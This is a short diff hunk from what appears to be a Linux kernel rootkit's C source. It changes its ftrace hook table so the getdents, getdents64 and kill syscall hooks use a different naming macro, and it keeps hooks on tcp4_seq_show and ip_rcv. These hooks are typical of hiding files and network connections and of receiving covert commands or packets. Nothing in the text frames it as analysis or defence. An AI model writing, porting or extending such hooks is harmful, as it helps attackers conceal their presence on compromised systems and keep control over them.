@@ -309,9 +309,9 @@ asmlinkage int hook_ip_rcv(struct sk_buff *skb, struct net_device *dev,
 }
 
 static struct ftrace_hook hooks[] = {
-    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
-    HOOK("__x64_sys_getdents", hook_getdents, &orig_getdents),
-    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
+    HOOK_N("sys_getdents64", hook_getdents64, &orig_getdents64),
+    HOOK_N("sys_getdents", hook_getdents, &orig_getdents),
+    HOOK_N("sys_kill", hook_kill, &orig_kill),
     HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
     HOOK("ip_rcv", hook_ip_rcv, &orig_ip_rcv),
 };
